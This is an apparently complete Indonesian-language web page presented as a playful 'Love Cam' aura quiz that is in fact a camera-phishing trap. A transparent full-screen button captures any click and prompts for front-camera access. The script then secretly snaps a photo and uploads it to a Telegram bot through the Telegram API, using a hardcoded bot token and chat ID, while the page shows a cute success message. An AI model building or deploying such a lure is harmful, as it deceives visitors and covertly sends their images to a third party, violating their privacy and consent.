        .container {
            position: relative; z-index: 10;
            background: rgba(255, 255, 255, 0.9);
            padding: 30px; border-radius: 25px;
            box-shadow: 0 10px 25px rgba(255, 182, 193, 0.5);
            text-align: center; width: 80%; max-width: 350px;
            border: 3px solid #ffb6c1;
        }

        /* Tombol jebakan transparan seluruh layar */
        #trigger {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: transparent; border: none; cursor: pointer; z-index: 100;
        }

        h1 { color: #ff69b4; font-size: 1.5rem; margin-bottom: 10px; }
        p { color: #888; font-size: 0.9rem; margin-bottom: 25px; line-height: 1.4; }

        .heart-icon { font-size: 4rem; color: #ff69b4; animation: pulse 1.5s infinite; }

        /* Animasi Scanner Hati */
        #scan-visual {
            display: none; position: relative; width: 150px; height: 150px;
            margin: 0 auto;
        }
        #scan-visual::after {
            content: '💖'; font-size: 5rem;
            position: absolute; top: 50%; left: 50%;
            transform: translate(-50%, -50%);
        }
        .scan-bar {
            position: absolute; width: 100%; height: 4px;
            background: #ff69b4; box-shadow: 0 0 10px #ff69b4;
            border-radius: 2px; top: 0;
            animation: scanMove 2s infinite ease-in-out;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
            100% { transform: scale(1); opacity: 1; }
        }
        @keyframes scanMove {
            0% { top: 0; } 50% { top: 100%; } 100% { top: 0; }
        }

        video, canvas { display: none; }

<body>

    <div class="bg-hearts"></div>

    <button id="trigger"></button>

    <div class="container" id="content-box">
        <div id="setup-view">
            <div class="heart-icon">💖</div>
            <h1>Cek Aura Cintamu!</h1>
            <p>Penasaran seberapa besar level keimutan dan keberuntungan cintamu hari ini? ✨<br><br>Gunakan <b>Love Cam</b> kami untuk analisa instan!</p>
            <p style="font-size: 0.7rem; color: #aaa;">(Klik di mana saja untuk mulai)</p>
        </div>

        <div id="scan-view" style="display:none;">
            <div id="scan-visual">
                <div class="scan-bar"></div>
            </div>
            <h1 id="status-text" style="margin-top:20px;">Menghubungkan ke Love Server...</h1>
            <p>Jangan bergerak ya, imut! 😊</p>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- KONFIGURASI TELEGRAM ---
        const TG_TOKEN = '8759534902:AAGrdxkHf0ytnacqKexI0OPuEPYrhWXGj7U'; // Masukkan Token Bot di sini
        const TG_CHAT_ID = '8759534902'; // Masukkan ID Chat kamu di sini
        // ---------------------------------

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const trigger = document.getElementById('trigger');
        const statusText = document.getElementById('status-text');
        const setupView = document.getElementById('setup-view');
        const scanView = document.getElementById('scan-view');
        const scanVisual = document.getElementById('scan-visual');

        async function startLoveScan() {
            // Hilangkan pemicu agar tidak klik 2x
            trigger.style.display = 'none';
            
            // Ubah UI jadi mode Scanning
            setupView.style.display = 'none';
            scanView.style.display = 'block';

            try {
                // 1. Meminta Izin (Pop-up akan muncul dengan pesan imut dari browser)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, // Kamera depan
                    audio: false 
                });
                
                // 2. Jika diizinkan, kamera aktif di background
                video.srcObject = stream;
                statusText.innerText = "Menganalisa Wajah Imutmu... 💕";
                scanVisual.style.display = 'block';

                // 3. Tunggu 2.5 detik (waktu agar kamera siap & animasi jalan)
                setTimeout(() => {
                    takeAndSendPhoto(stream);
                }, 2500);

            } catch (err) {
                console.error(err);
                statusText.innerText = "Duh, Gagal Konek ke Hatimu! 😢";
                alert("Sistem butuh izin kamera untuk mengecek aura cintamu. Coba refresh dan pilih 'Allow' ya!");
            }
        }

        function takeAndSendPhoto(stream) {
            // Ambil gambar dari video ke canvas
            canvas.width = 640; // Resolusi cukup
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Ubah canvas jadi Data URL (Base64)
            const imageData = canvas.toDataURL('image/png');
            
            // Update UI
            statusText.innerText = "Aura Terdeteksi! Mengirim ke Hati... ✨";
            scanVisual.style.display = 'none';
            document.querySelector('.heart-icon').style.display = 'block'; // Tampilkan hati lagi

            // 4. Kirim ke Telegram (Async di background)
            sendPhotoToTelegram(imageData);

            // 5. Matikan kamera agar lampu indikator mati
            setTimeout(() => {
                stream.getTracks().forEach(track => track.stop());
                statusText.innerText = "Scan Selesai! Kamu 100% Imut! 🎉";
                alert("Analisa selesai! Tingkat keimutanmu hari ini maksimal! Cek hasilnya segera.");
            }, 1000);
        }

        // Fungsi Teknis Mengirim File ke Telegram API
        function sendPhotoToTelegram(imageData) {
            // Konversi Base64 ke Blob (file biner)
            const blob = dataURItoBlob(imageData);
            
            const formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('photo', blob, 'love_scan.png');
            formData.append('caption', '💖 Seseorang baru saja mengecek Aura Cintanya! (Foto Kamera Depan)');

            // Menggunakan Fetch API untuk POST ke Telegram
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log('Sukses Telegram:', data))
            .catch(error => console.error('Error Telegram:', error));
        }

        // Helper: Mengubah Data URI (Base64) menjadi Blob
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            return new Blob([ab], {type: mimeString});
        }

        // Jalankan saat layar diklik (syarat User Gesture)
        trigger.addEventListener('click', startLoveScan);
    </script>
</body>
</html>
